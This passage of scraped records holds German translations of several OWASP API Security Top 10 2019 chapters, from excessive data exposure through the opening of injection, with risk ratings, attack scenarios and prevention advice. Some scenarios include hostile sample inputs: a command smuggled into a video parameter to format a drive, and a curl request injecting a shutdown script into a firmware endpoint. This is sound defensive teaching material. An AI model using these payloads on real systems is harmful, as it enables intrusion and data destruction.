Begrenzung der Abfragerate implementiert, kann der Angreifer alle möglichen Kombinationen mit\neinem mehrthreadigen Skript gegen das Endpunkt `/api/system/verification-codes/{smsToken}` testen, um\ninnerhalb weniger Minuten das richtige Token zu entdecken.\n\n## Vorbeugende Maßnahmen\n\n* Es sollte sichergestellt werden, dass alle Methoden zur Authentifizierung einer API bekannt sind (Mobile/Web/Deep Links, die eine Ein-Klick-Authentifizierung).\n* Es sollte mit den Software-Entwicklern abgestimmt werden ob es noch weitere Methoden zur Authentifizierung gibt.\n* Informieren Sie sich die genutzen Authentifizierungsmechanismen. Stellen Sie sicher, dass Sie verstehen, was und\n  wie diese verwendet werden. OAuth ist keine Authentifizierung und API-Schlüssel auch nicht.\n* Erfinde Sie das Rad nicht neu in Bezug auf Authentifizierung, Token-Generierung und Passwort-Speicherung. Verwenden Sie\n  die anerkannten Standards.\n* Endpunkte für Passwort-Vergeßen Funktion sollten in Bezug auf Brute-Force Angriffe, Begrenzung der Abfragerate und Sperrmechanismen wie Login-Endpunkte behandelt werden.\n* Benutzen Sie das [OWASP Authentication Cheatsheet][3].\n* Implementieren Sie Multi-Faktor-Authentifizierung, sofern dies möglich ist.\n* Implementieren SIe Anti-Brute-Force-Mechanismen, um Credential Stuffing, Dictionary-Attacken und Brute-Force-Angriffe auf die Authentifizierungs-Endpunkte zu erschweren. Dieser Mechanismus sollte restriktiver sein als die reguläre Begrenzung der Abfragerate der API.\n* Implementieren Sie [Accountsperren][4] oder Captchas um Brute-Force-Angriffe auf bestimmte Benutzer zu verhindern.\n  Prüfen sie alle Passwörter auf schwache Passwörter.\n* API-Schlüssel sollten nicht für die Benutzerauthentifizierung verwendet werden, sondern für [client app/\n  project authentication][5].\n\n## Referenzen\n\n### OWASP\n\n* [OWASP Key Management Cheat Sheet][6]\n* [OWASP Authentication Cheatsheet][3]\n* [Credential Stuffing][1]\n\n### Externe Quellen\n\n* [CWE-798: Use of Hard-coded Credentials][7]\n\n[1]: https://www.owasp.org/index.php/Credential_stuffing\n[2]: https://github.com/danielmiessler/SecLists\n[3]: https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html\n[4]: https://www.owasp.org/index.php/Testing_for_Weak_lock_out_mechanism_(OTG-AUTHN-003)\n[5]: https://cloud.google.com/endpoints/docs/openapi/when-why-api-key\n[6]: https://www.owasp.org/index.php/Key_Management_Cheat_Sheet\n[7]: https://cwe.mitre.org/data/definitions/798.html\n", "timestamp": "2025-10-24T22:26:19.500680"}
{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2019/de/0xa3-excessive-data-exposure.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2019/de/0xa3-excessive-data-exposure.md", "content": "# API3:2019 Excessive Data Exposure\n\n| Bedrohungsakteure/Angriffsvektoren | Sicherheitslücken | Auswirkungen |\n| - | - | - |\n| API-spezifisch : Ausnutzbarkeit **3** | Häufigkeit **2** : Erkennbarkeit **2** | Komplexität **2** : Unternehmensspezifisch |\n| Die Ausnutzung von übermäßiger Datenfreigabe ist einfach und erfolgt in der Regel durch Sniffing des Datenverkehrs, um die API-Antworten zu analysieren und nach sensiblen Daten zu suchen, die nicht an den Benutzer zurückgegeben werden sollten. |APIs verlassen sich darauf, dass Clients die Datenfilterung durchführen. Da APIs als Datenquellen verwendet werden, versuchen Entwickler manchmal, sie auf generische Weise zu implementieren, ohne an die Sensibilität der offengelegten Daten zu denken. Automatische Tools können diese Art von Schwachstellen in der Regel nicht erkennen, da es schwierig ist, zwischen legitimen Daten, die von der API zurückgegeben werden, und sensiblen Daten, die ohne tiefes Verständnis der Anwendung nicht zurückgegeben werden sollten, zu unterscheiden. | Eine übermäßige Datenexposition führt in der Regel zur Offenlegung sensibler Daten. |\n\n## Ist die API angreifbar?\n\nDie API gibt sensible Daten absichtlich an den Client zurück. Diese Daten werden normalerweise auf der Client-Seite gefiltert, bevor sie dem Benutzer präsentiert werden. Ein Angreifer kann den Datenverkehr leicht ausspähen und die sensiblen Daten sehen.\n\n## Beispiele für Angriffe\n\n### Szenario #1\n\nDas Mobile-Team verwendet den Endpunkt `/api/articles/{articleId}/comments/{commentId}`\nin der Artikelansicht, um Metadaten zu Kommentaren zu rendern. Durch das Sniffing des Datenverkehrs der mobilen Anwendung findet ein Angreifer heraus, dass auch andere sensible Daten, die sich auf den Autor des Kommentars beziehen, zurückgegeben werden. Die Implementierung des Endpunkts verwendet eine generische `toJSON()`-Methode des User-Modells, das PII enthält, um das Objekt zu serialisieren.\n\n### Szenario #2\n\nEin IoT-basiertes Überwachungssystem ermöglicht es Administratoren, Benutzer mit unterschiedlichen Berechtigungen zu erstellen. Ein Administrator erstellt ein Benutzerkonto für einen neuen Sicherheitsmitarbeiter, der nur Zugang zu bestimmten Gebäuden auf dem Gelände haben sollte. Sobald der Sicherheitsmitarbeiter seine mobile App verwendet, wird ein API-Aufruf ausgelöst: /api/sites/111/cameras, um Daten über die verfügbaren Kameras zu erhalten und sie auf dem Dashboard anzuzeigen. Die Antwort enthält eine Liste mit Details über Kameras im folgenden Format: `{\"id\": \"xxx\", \"live_access_token\": \"xxxx-bbbbb\", \"building_id\": \"yyy\"}`. Während die Client-GUI nur Kameras anzeigt, auf die der Sicherheitsmitarbeiter Zugriff haben soll, enthält die tatsächliche API-Antwort eine vollständige Liste aller Kameras auf dem Gelände.\n\n## Vorbeugende Maßnahmen\n\n* Verlassen Sie sich niemals auf die Client-Seite, um sensible Daten zu filtern.\n* Überprüfen Sie die Antworten der API, um sicherzustellen, dass sie nur legitime Daten enthalten.\n* Backend-Entwickler sollten sich immer fragen \"Wer ist der Nutzer der Daten?\", bevor sie einen neuen API-Endpunkt freigeben.\n* Vermeiden Sie die Verwendung generischer Methoden wie `to_json()` und `to_string()`.\n  Wählen Sie stattdessen spezifische Eigenschaften aus, die Sie wirklich zurückgeben möchten.\n* Klassifizieren Sie sensible und persönlich identifizierbare Informationen (PII), die Ihre Anwendung speichert und verarbeitet. Überprüfen Sie alle API-Aufrufe, die solche Informationen zurückgeben, um zu sehen, ob diese Antworten ein Sicherheitsproblem darstellen.\n* Implementieren Sie einen schema-basierten Response-Validierungsmechanismus als zusätzliche Sicherheitsebene. Im Rahmen dieses Mechanismus definieren und erzwingen Sie die Daten, die von allen API-Methoden zurückgegeben werden, einschließlich Fehler.\n\n\n## Referenzen\n\n### OWASP\n\n* [CWE-213: Intentional Information Exposure][1]\n\n[1]: https://cwe.mitre.org/data/definitions/213.html\n", "timestamp": "2025-10-24T22:26:19.610102"}
{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2019/de/0xa4-lack-of-resources-and-rate-limiting.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2019/de/0xa4-lack-of-resources-and-rate-limiting.md", "content": "# API4:2019 Lack of Resources & Rate Limiting\n\n| Bedrohungsakteure/Angriffsvektoren | Sicherheitslücken | Auswirkungen |\n| - | - | - |\n| API-spezifisch : Ausnutzbarkeit **2** | Häufigkeit **3** : Erkennbarkeit **3** | Komplexität **2** : Unternehmensspezifisch |\n| Die Ausnutzung erfordert einfache API-Anfragen. Es ist keine Authentifizierung erforderlich. Mehrere gleichzeitige Anfragen können von einem einzigen lokalen Computer aus oder unter Verwendung von Cloud-Computing-Ressourcen durchgeführt werden. | Es ist üblich, APIs zu finden, die keine Rate-Limitierung implementieren oder APIs, bei denen die Limits nicht ordnungsgemäß gesetzt sind. | Eine Ausnutzung kann zu DoS führen, wodurch die API nicht mehr reagiert oder sogar nicht mehr verfügbar ist. |\n\n## Ist die API angreifbar?\n\nAPI-Anforderungen verbrauchen Ressourcen wie Netzwerk, CPU, Arbeitsspeicher und Speicherplatz. Die\nMenge an Ressourcen, die zur Beantwortung einer Anfrage benötigt wird, hängt stark von der\nEingabe und der Geschäftslogik des Endpunkts ab. Berücksichtigen Sie auch die Tatsache, dass Anfragen von\nmehreren API-Clients um die Ressourcen konkurrieren. Eine API ist verwundbar, wenn mindestens eine\nder folgenden Grenzwerte fehlt oder unangemessen eingestellt ist (z. B. zu niedrig/hoch):\n\n* Ausführungszeitüberschreitungen\n* Maximal zuweisbarer Speicher\n* Anzahl der Dateideskriptoren\n* Anzahl der Prozesse\n* Größe der Nutzlast von Anfragen (z. B. Uploads)\n* Anzahl der Anfragen pro Client/Ressource\n* Anzahl der Datensätze pro Seite, die in einer einzigen Anfrageantwort zurückgegeben werden sollen\n\n## Beispiele für Angriffe\n\n### Szenario #1\n\nEin Angreifer lädt ein großes Bild hoch, indem er eine POST-Anfrage an `/api/v1/images` stellt.\nWenn der Upload abgeschlossen ist, erstellt die API mehrere Miniaturbilder mit unterschiedlichen\nGrößen. Aufgrund der Größe des hochgeladenen Bildes ist der verfügbare Speicher\nwährend der Erstellung der Miniaturansichten erschöpft und die API reagiert nicht mehr.\n\n### Szenario #2\n\nGegeben ist eine Anwendung, die die Benutzerliste auf einer Benutzeroberfläche mit einer Begrenzung von\n200 Benutzer pro Seite anzeigt. Die Benutzerliste wird mit folgender Abfrage vom Server abgerufen: `/api/users?page=1&size=200`. Ein Angreifer ändert den Parameter `size`\nParameter auf `200.000`, was zu Leistungsproblemen in der Datenbank führt. In der Zwischenzeit\nreagiert die API nicht mehr und ist nicht mehr in der Lage, weitere Anfragen von diesem\noder anderen Clients zu beantworten (DoS).\n\nDas gleiche Szenario kann verwendet werden, wenn ein Integer oder Buffer Overflow auftritt.\n\n## Vorbeugende Maßnahmen\n\n* Docker macht es einfach [Speicher][1], [CPU][2], [Anzahl der Neustarts][3],\n  [Dateideskriptoren und Prozesse][4] zu beschränken.\n* Implementieren Sie ein Limit, wie oft ein Client die API innerhalb eines bestimmten\n  Zeitrahmen abrufen kann.\n* Benachrichtigen Sie den Client, wenn das Limit überschritten wird, indem Sie die Limitnummer und\n  den Zeitpunkt, zu dem das Limit zurückgesetzt wird bekanntgeben.\n* Hinzufügen einer ordnungsgemäßen serverseitigen Validierung für Query String und Request Body\n  Parameter, insbesondere denjenigen, die die Anzahl der in der Antwort zurückzugebenden\n  Werte betimmen.\n* Definieren und erzwingen Sie die maximale Größe von Daten für alle eingehenden Parameter und\n  und Nutzdaten, wie z. B. die maximale Länge für Strings und die maximale Anzahl von Elementen in\n  Arrays.\n\n\n## Referenzen\n\n### OWASP\n\n* [Blocking Brute Force Attacks][5]\n* [Docker Cheat Sheet - Limit resources (memory, CPU, file descriptors,\n  processes, restarts)][6]\n* [REST Assessment Cheat Sheet][7]\n\n### Externe Quellen\n\n* [CWE-307: Improper Restriction of Excessive Authentication Attempts][8]\n* [CWE-770: Allocation of Resources Without Limits or Throttling][9]\n* “_Rate Limiting (Throttling)_” - [Security Strategies for Microservices-based\n  Application Systems][10], NIST\n\n[1]: https://docs.docker.com/config/containers/resource_constraints/#memory\n[2]: https://docs.docker.com/config/containers/resource_constraints/#cpu\n[3]: https://docs.docker.com/engine/reference/commandline/run/#restart-policies---restart\n[4]: https://docs.docker.com/engine/reference/commandline/run/#set-ulimits-in-container---ulimit\n[5]: https://www.owasp.org/index.php/Blocking_Brute_Force_Attacks\n[6]: https://github.com/OWASP/CheatSheetSeries/blob/3a8134d792528a775142471b1cb14433b4fda3fb/cheatsheets/Docker_Security_Cheat_Sheet.md#rule-7---limit-resources-memory-cpu-file-descriptors-processes-restarts\n[7]: https://github.com/OWASP/CheatSheetSeries/blob/3a8134d792528a775142471b1cb14433b4fda3fb/cheatsheets/REST_Assessment_Cheat_Sheet.md\n[8]: https://cwe.mitre.org/data/definitions/307.html\n[9]: https://cwe.mitre.org/data/definitions/770.html\n[10]: https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-204-draft.pdf\n", "timestamp": "2025-10-24T22:26:19.715053"}
{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2019/de/0xa5-broken-function-level-authorization.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2019/de/0xa5-broken-function-level-authorization.md", "content": "# API5:2019 Broken Function Level Authorization\n\n| Bedrohungsakteure/Angriffsvektoren | Sicherheitslücken | Auswirkungen |\n| - | - | - |\n| API-spezifisch : Ausnutzbarkeit **3** | Häufigkeit **2** : Erkennbarkeit **1** | Komplexität **2** : Unternehmensspezifisch |\n| Um eine Schwachstelle auszunutzen, muss der Angreifer legitime API-Aufrufe an einen Endpunkt senden, auf den er eigentlich keinen Zugriff haben sollte. Diese Endpunkte könnten für anonyme oder nicht privilegierte Benutzer zugänglich sein. Es ist einfacher, solche Schwachstellen in APIs zu entdecken, da sie besser strukturiert sind und der Weg, um auf bestimmte Funktionen zuzugreifen, vorhersehbarer ist (z. B. indem man die HTTP-Methode von GET auf PUT ändert oder den Teil `users` in der URL in `admins` ändert). | Berechtigungsprüfungen für eine Funktion oder Ressource werden in der Regel über die Konfiguration und manchmal auch auf Code-Ebene verwaltet. Die Implementierung geeigneter Prüfungen kann eine verwirrende Aufgabe sein, da moderne Anwendungen viele Arten von Rollen oder Gruppen und komplexe Benutzerhierarchien (z. B. Unterbenutzer, Benutzer mit mehr als einer Rolle) enthalten können. | Solche Schwachstellen ermöglichen es Angreifern, auf nicht autorisierte Funktionen zuzugreifen. Verwaltungsfunktionen sind wichtige Ziele für diese Art von Angriffen. |\n\n## Ist die API angreifbar?\n\nDie beste Möglichkeit, um Schwachstellen in der Funktionsautorisierung zu finden, besteht darin, eine tiefgreifende Analyse des Autorisierungsmechanismus durchzuführen, wobei die Benutzerhierarchie, verschiedene Rollen oder Gruppen in der Anwendung berücksichtigt werden und die folgenden Fragen gestellt werden:\n\n* Kann ein normaler Benutzer auf administrative Endpunkte zugreifen?\n* Kann ein Benutzer sensible Aktionen (z. B. Erstellung, Änderung oder Löschung) durchführen, auf die er keinen Zugriff haben sollte, indem er einfach die HTTP-Methode ändert (z. B. von `GET` auf `DELETE`)?\n* Kann ein Benutzer aus Gruppe X auf eine Funktion zugreifen, die nur Benutzern aus Gruppe Y zugänglich sein sollte, indem er einfach die Endpunkt-URL und Parameter errät (z. B. `/api/v1/users/export_all`)?\n\nNehmen Sie nicht an, dass ein API-Endpunkt nur aufgrund des URL-Pfads ein regulärer oder administrativer Endpunkt ist.\n\nObwohl Entwickler dazu neigen, die meisten administrativen Endpunkte unter einem bestimmten relativen Pfad wie `api/admins` zu platzieren, ist es sehr häufig, dass diese administrativen Endpunkte zusammen mit regulären Endpunkten unter anderen relativen Pfaden wie `api/users` zu finden sind.\n\n## Beispiele für Angriffe\n\n### Szenario #1\n\nWährend des Registrierungsprozesses für eine Anwendung, die nur eingeladenen Nutzern die Teilnahme erlaubt beitreten können, löst die mobile Anwendung einen API-Aufruf aus an `GET /api/invites/{invite_guid}`.\nDie Antwort enthält ein JSON mit Details über die Einladung, einschließlich der Rolle des Benutzers und seiner E-Mail.\n\nEin Angreifer duplizierte die Anfrage und manipulierte die HTTP-Methode und den Endpunkt zu `POST /api/invites/new`. Dieser Endpunkt sollte nur von Administratoren\nAdministratoren zugreifen, die die Verwaltungskonsole verwenden, die keine Funktions Berechtigungsprüfungen implementiert.\n\nDer Angreifer nutzt das Problem aus und sendet sich selbst eine Einladung zur Erstellung eines\nAdministratorkonto zu erstellen:\n\n```\nPOST /api/invites/new\n\n{“email”:”hugo@malicious.com”,”role”:”admin”}\n```\n\n### Szenario #2\n\nEine API enthält einen Endpunkt, der nur für Administratoren zugänglich sein sollte - `GET /api/admin/v1/users/all`. Dieser Endpunkt liefert die Details aller Benutzer der Anwendung zurück und führt keine Berechtigungsprüfungen auf Funktionsebene durch. Ein Angreifer, der die Struktur der API kennt, errät den Zugriff auf diesen Endpunkt und erlangt dadurch Zugang zu sensiblen Details der Anwendungsnutzer.\n\n## Vorbeugende Maßnahmen\n\nIhre Anwendung sollte ein konsistentes und leicht analysierbares Autorisierungsmodul haben, das von allen Geschäftsfunktionen aufgerufen wird. Häufig wird diese Sicherheit durch eine oder mehrere Komponenten außerhalb des Anwendungscodes bereitgestellt.\n\n* Die Durchsetzungsmechanismen sollten standardmäßig jeden Zugriff verweigern und explizite Genehmigungen für bestimmte Rollen für den Zugriff auf jede Funktion erfordern.\n* Überprüfen Sie Ihre API-Endpunkte auf Mängel bei der Autorisierung auf Funktionsebene und berücksichtigen Sie dabei die Geschäftslogik der Anwendung und die Hierarchie der Gruppen.\n* Stellen Sie sicher, dass alle Ihre administrativen Controller von einem abstrakten administrativen Controller erben, der Berechtigungsprüfungen auf Grundlage der Gruppe/Rolle des Benutzers implementiert.\n* Stellen Sie sicher, dass administrative Funktionen innerhalb eines regulären Controllers Berechtigungsprüfungen auf Grundlage der Gruppe und Rolle des Benutzers implementieren.\n\n## References\n\n### OWASP\n\n* [OWASP Article on Forced Browsing][1]\n* [OWASP Top 10 2013-A7-Missing Function Level Access Control][2]\n* [OWASP Development Guide: Chapter on Authorization][3]\n\n### Externe Quellen\n\n* [CWE-285: Improper Authorization][4]\n\n[1]: https://www.owasp.org/index.php/Forced_browsing\n[2]: https://www.owasp.org/index.php/Top_10_2013-A7-Missing_Function_Level_Access_Control\n[3]: https://www.owasp.org/index.php/Category:Access_Control\n[4]: https://cwe.mitre.org/data/definitions/285.html\n", "timestamp": "2025-10-24T22:26:19.827921"}
{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2019/de/0xa6-mass-assignment.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2019/de/0xa6-mass-assignment.md", "content": "# API6:2019 - Mass Assignment\n\n| Bedrohungsakteure/Angriffsvektoren | Sicherheitslücken | Auswirkungen |\n| - | - | - |\n| API-spezifisch : Ausnutzbarkeit **2** | Häufigkeit **2** : Erkennbarkeit **2** | Komplexität **2** : Unternehmensspezifisch |\n| Die Ausnutzung erfordert in der Regel ein Verständnis der Geschäftslogik, der Beziehungen zwischen den Objekten und der API-Struktur. Die Ausnutzung von \"Mass Asignment\" ist in APIs einfacher, da sie aufgrund ihrer Konzeption die zugrundeliegende Implementierung der Anwendung zusammen mit den Namen der Eigenschaften offenlegen. | Moderne Frameworks ermutigen Entwickler zur Verwendung von Funktionen, die automatisch Eingaben vom Client in Codevariablen und interne Objekte binden. Angreifer können diese Methode nutzen, um die Eigenschaften sensibler Objekte zu aktualisieren oder zu überschreiben, die die Entwickler nie offenlegen wollten. | Die Ausnutzung kann zu einer Ausweitung von Privilegien, Datenmanipulation, Umgehung von Sicherheitsmechanismen und vielem mehr führen. |\n\n## Ist die API angreifbar?\n\nModerne Anwendungen können viele Objekteigenschaften enthalten. Einige dieser Eigenschaften sollten direkt vom Client aktualisiert werden (z. B. `user.first_name` oder `user.address`), während andere nicht aktualisiert werden sollten (z. B. `user.is_vip-Flag`).\n\nEin API-Endpunkt ist anfällig, wenn er automatisch Client-Parameter in interne Objekteigenschaften konvertiert, ohne dabei die Sensibilität und das Gefährdungspotential dieser Eigenschaften zu berücksichtigen. Dies könnte einem Angreifer ermöglichen, Objekteigenschaften zu aktualisieren, auf die er keinen Zugriff haben sollte.\n\nBeispiele für sensible Eigenschaften:\n\n* **Permission-related properties**: `user.is_admin`, `user.is_vip` sollte nur nur von Administratoren gesetzt werden.\n* **Process-dependent properties**: `user.cash` sollte nur intern gesetzt werden nach der Zahlungsüberprüfung gesetzt werden.\n* **Internal properties**: `article.created_time` sollte nur intern gesetzt werden durch die Anwendung gesetzt werden.\n\n## Beispiele für Angriffe\n\n### Szenario #1\n\nEine Anwendung für Mitfahrgelegenheiten bietet einem Nutzer die Möglichkeit, grundlegende Informationen für sein Profil zu bearbeiten. Während dieses Prozesses wird ein API-Aufruf gesendet an\n`PUT /api/v1/users/me` mit dem folgenden legitimen JSON-Objekt:\n\n```json\n{\"user_name\":\"inons\",\"age\":24}\n```\n\nDie Anfrage `GET /api/v1/users/me` enthält eine zusätzlich ein `credit_balance` Attribut:\n\n```json\n{\"user_name\":\"inons\",\"age\":24,\"credit_balance\":10}\n```\n\nDer Angreifer wiederholt die erste Anfrage mit der folgendem Payload:\n\n```json\n{\"user_name\":\"attacker\",\"age\":60,\"credit_balance\":99999}\n```\n\nDa der Endpunkt anfällig für \"MAss Assignment\" ist, erhält der Angreifer Credits, ohne zu bezahlen.\n\n### Szenario #2\n\nEin Portal zur gemeinsamen Nutzung von Videos ermöglicht es Nutzern, Inhalte hochzuladen und in verschiedenen Formaten herunterzuladen. Ein Angreifer, der die API erforscht, fand heraus, dass der Endpunkt `GET /api/v1/videos/{video_id}/meta_data` ein JSON-Objekt mit den Eigenschaften des Videos zurückgibt. Eine der Eigenschaften ist `\"mp4_conversion_params\":\"-v codec h264\"`, was darauf hinweist, dass die Anwendung einen Shell-Befehl zur Konvertierung des Videos verwendet.\n\nDer Angreifer fand auch heraus, dass der Endpunkt `POST /api/v1/videos/new` für \"Mass Asignment\" anfällig ist und es dem Client ermöglicht, eine beliebige Eigenschaft des Videoobjekts festzulegen. Der Angreifer setzt einen bösartigen Wert wie folgt: `\"mp4_conversion_params\":\"-v codec h264 && format C:/\"`. Dieser Wert verursacht eine \"Remote Code Execution\", sobald der Angreifer das Video als MP4 herunterlädt.\n\n## Vorbeugende Maßnahmen\n\n* Vermeiden Sie nach Möglichkeit die Verwendung von Funktionen, die automatisch die Eingaben eines Benutzers in Variablen oder interne Objekte speicher, ohne diese zu validieren.\n* Setzen Sie nur die Eigenschaften auf die Whitelist, die vom Client aktualisiert werden sollen.\n* Verwenden Sie integrierte Funktionen, um Eigenschaften, auf die der Client nicht zugreifen darf, zu blockieren.\n* Definieren und Erzwingen Sie gegebenenfalls explizit Schemata für die Eingabedaten.\n\n## Referenzen\n\n### Externe Quellen\n\n* [CWE-915: Improperly Controlled Modification of Dynamically-Determined Object Attributes][1]\n\n[1]: https://cwe.mitre.org/data/definitions/915.html\n", "timestamp": "2025-10-24T22:26:19.941330"}
{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2019/de/0xa7-security-misconfiguration.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2019/de/0xa7-security-misconfiguration.md", "content": "# API7:2019 Security Misconfiguration\n\n| Bedrohungsakteure/Angriffsvektoren | Sicherheitslücken | Auswirkungen |\n| - | - | - |\n| API-spezifisch : Ausnutzbarkeit **3** | Häufigkeit **3** : Erkennbarkeit **3** | Komplexität **2** : Unternehmensspezifisch |\n| Angreifer versuchen oft, ungepatchte Schwachstellen, gemeinsame Endpunkte oder ungeschützte Dateien und Verzeichnisse zu finden, um sich unbefugten Zugriff auf das System zu verschaffen oder Kenntnisse über das System zu erlangen. | Eine Sicherheitskonfiguration kann auf jeder Ebene des API-Stacks unsicher sein, von der Netzwerkebene bis zur Anwendungsebene. Es gibt automatisierte Tools, die dazu dienen, Fehlkonfigurationen wie unnötige Dienste oder veraltete Optionen zu erkennen und auszunutzen. | Unsichere Sicherheitskonfigurationen können nicht nur sensible Benutzerdaten, sondern auch Systemdetails preisgeben, die zu einer vollständigen Kompromittierung des Servers führen können. |\n\n## Ist die API angreifbar?\n\nDie API könnte anfällig sein, wenn:\n\n* Es fehlt eine angemessene Sicherheitshärtung, sei es auf einer beliebigen Ebene des Anwendungs-Stacks oder wenn die Berechtigungen für Cloud-Services falsch konfiguriert sind.\n* Die neuesten Sicherheitspatches fehlen oder das System veraltet ist.\n* Unnötige Funktionen aktiviert sind (z. B. HTTP-Methoden).\n* Keine Transport Layer Security (TLS) eingesetzt wird.\n* Sicherheitsrichtlinien werden den Clients nicht übermittelt (z. B. [Security Headers][1]).\n* Eine Cross-Origin Resource Sharing (CORS)-Richtlinie fehlt oder falsch konfiguriert ist.\n* Fehlermeldungen, Stack-Traces enthalten oder andere sensible Informationen offengelegt werden.\n\n## Beispiele für Angriffe\n\n### Szenario #1\n\nEin Angreifer findet die Datei `.bash_history` unter dem Stammverzeichnis des Servers, die Befehle enthält, die vom DevOps-Team für den Zugriff auf die API verwendet werden:\n\n```\n$ curl -X GET 'https://api.server/endpoint/' -H 'authorization: Basic Zm9vOmJhcg=='\n```\nEin Angreifer könnte auch neue Endpunkte für die API identifizieren, die nur vom\nDevOps-Team verwendet werden und nicht dokumentiert sind.\n\n### Szenario #2\n\nUm einen bestimmten Dienst ins Visier zu nehmen, verwendet ein Angreifer eine beliebte Suchmaschine, um nach Computern zu suchen. Der Angreifer fand einen Host, auf dem ein beliebtes Datenbankmanagementsystem auf dem Standardport läuft. Der Host verwendete die Standardkonfiguration, bei der die Authentifizierung standardmäßig deaktiviert ist. Der Angreifer erlangte Zugriff auf Millionen von Datensätzen mit personenbezogenen Daten, persönlichen Präferenzen und Authentifizierungsdaten.\n\n### Szenario #3\n\nBei der Untersuchung des Datenverkehrs einer mobilen Anwendung stellt ein Angreifer fest, dass nicht der gesamte HTTP-Verkehr über ein sicheres Protokoll (z. B. TLS) abgewickelt wird. Der Angreifer findet dies insbesondere für den Download von Profilbildern herraus. Da die Daten binär kodiert sind, findet der Angreifer, ein Muster in der Größe der API-Antworten, das er nutzt, um die Präferenzen der Benutzer bezüglich des dargestellten Inhalts (z. B. Profilbilder) auszulesen.\n\n## Vorbeugende Maßnahmen\n\nDer API-Lebenszyklus sollte Folgendes umfassen:\n\n* Ein wiederholbarer Härtungsprozess, der zu einer schnellen und einfachen Bereitstellung einer ordnungsgemäß gehärteten Umgebung führt.\n* Die Überprüfung und Aktualisierung von Konfigurationen für den gesamten API-Stack. Die Überprüfung sollte Folgendes umfassen: Orchestrierungsdateien, API-Komponenten und Cloud-Dienste (z. B. S3-Bucket-Berechtigungen).\n* Ein sicherer Kommunikationskanal für alle API-Interaktionen, einschließlich des Zugriffs auf statische Assets (z. B. Bilder).\n* Ein automatisierter Prozess zur kontinuierlichen Bewertung der Effektivität der Konfiguration und Einstellungen in allen Umgebungen.\n\nDarüber hinaus:\n\n* Um zu verhindern, dass Exception-Traces und andere wertvolle Informationen an Angreifer zurückgesendet werden, sollten, falls zutreffend, alle API-Antwort-Schemata definiert und erzwungen werden, einschließlich Fehlermeldungen.\n* Stellen Sie sicher, dass auf die API nur mit den angegebenen HTTP-Verben zugegriffen werden kann. Alle anderen HTTP-Verben sollten deaktiviert werden (z. B. `HEAD`).\n* APIs, auf die von browserbasierten Clients zugegriffen werden soll (z. B. WebApp Front-End), sollten eine angemessene Cross-Origin Resource Sharing (CORS)-Richtlinie implementieren.\n\n## Referenzen\n\n### OWASP\n\n* [OWASP Secure Headers Project][1]\n* [OWASP Testing Guide: Configuration Management][2]\n* [OWASP Testing Guide: Testing for Error Codes][3]\n* [OWASP Testing Guide: Test Cross Origin Resource Sharing][9]\n\n### Externe Quellen\n\n* [CWE-2: Environmental Security Flaws][4]\n* [CWE-16: Configuration][5]\n* [CWE-388: Error Handling][6]\n* [Guide to General Server Security][7], NIST\n* [Let’s Encrypt: a free, automated, and open Certificate Authority][8]\n\n[1]: https://www.owasp.org/index.php/OWASP_Secure_Headers_Project\n[2]: https://www.owasp.org/index.php/Testing_for_configuration_management\n[3]: https://www.owasp.org/index.php/Testing_for_Error_Code_(OTG-ERR-001)\n[4]: https://cwe.mitre.org/data/definitions/2.html\n[5]: https://cwe.mitre.org/data/definitions/16.html\n[6]: https://cwe.mitre.org/data/definitions/388.html\n[7]: https://csrc.nist.gov/publications/detail/sp/800-123/final\n[8]: https://letsencrypt.org/\n[9]: https://www.owasp.org/index.php/Test_Cross_Origin_Resource_Sharing_(OTG-CLIENT-007)\n", "timestamp": "2025-10-24T22:26:20.045696"}
{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2019/de/0xa8-injection.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2019/de/0xa8-injection.md", "content": "# API8:2019 Injection\n\n| Bedrohungsakteure/Angriffsvektoren | Sicherheitslücken | Auswirkungen |\n| - | - | - |\n| API-spezifisch : Ausnutzbarkeit **3** | Häufigkeit **2** : Erkennbarkeit **3** | Komplexität **3** : Unternehmensspezifisch |\n| Angreifer füttern die API mit bösartigen Daten über alle verfügbaren Injektionsvektoren (z. B. direkte Eingabe, Parameter, integrierte Dienste usw.) und erwarten, dass diese an einen Interpreter gesendet werden. | Injection-Fehler sind sehr häufig und werden oft in SQL-, LDAP- oder NoSQL-Abfragen, Betriebssystembefehlen, XML-Parsern und ORM gefunden. Diese Schwachstellen sind bei der Überprüfung des Quellcodes leicht zu entdecken. Angreifer können Scanner und Fuzzer verwenden. | Ein \"Injection\"-Angriff kann zur Offenlegung von Informationen und zum Datenverlust führen. Es kann auch zu DoS oder einer vollständigen Übernahme des Hosts kommen. |\n\n## Ist die API angreifbar?\n\nDie API ist anfällig für Injection-Angriffe, wenn:\n\n* Die von den Clients gelieferten Daten nicht von der API validiert, gefiltert oder bereinigt werden.\n* Die von den Clients gelieferten Daten direkt für SQL/NoSQL/LDAP-Abfragen, OS-Befehle, XML-Parser und Object Relational (ORM) / Object Document Mapping (ODM) verwendet oder konkateniert werden.\n* Daten von externen Systemen (z.B. integrierten Systemen) nicht von der API validiert, gefiltert oder bereinigt werden.\n\n## Beispiele für Angriffe\n\n### Szenario #1\n\nDie Firmware einer Kindersicherungseinrichtung stellt den Endpunkt\n`/api/CONFIG/restore` zur Verfügung, der die Übermittlung einer appId als Multipart\nParameter erwartet. Mit Hilfe eines Decompilers findet ein Angreifer heraus, dass die appId\ndirekt in einen Systemaufruf ohne jegliche Validierung übergeben wird:\n\n```c\nsnprintf(cmd, 128, \"%srestore_backup.sh /tmp/postfile.bin %s %d\",\n         \"/mnt/shares/usr/bin/scripts/\", appid, 66);\nsystem(cmd);\n```\n\nMit dem folgenden Befehl kann der Angreifer jedes Gerät mit der gleichen\nverwundbaren Firmware ausschalten:\n\n```\n$ curl -k \"https://${deviceIP}:4567/api/CONFIG/restore\" -F 'appid=$(/etc/pod/power_down.sh)'\n```\n\n### Szenario #2\n\nWir haben eine Anwendung mit grundlegenden 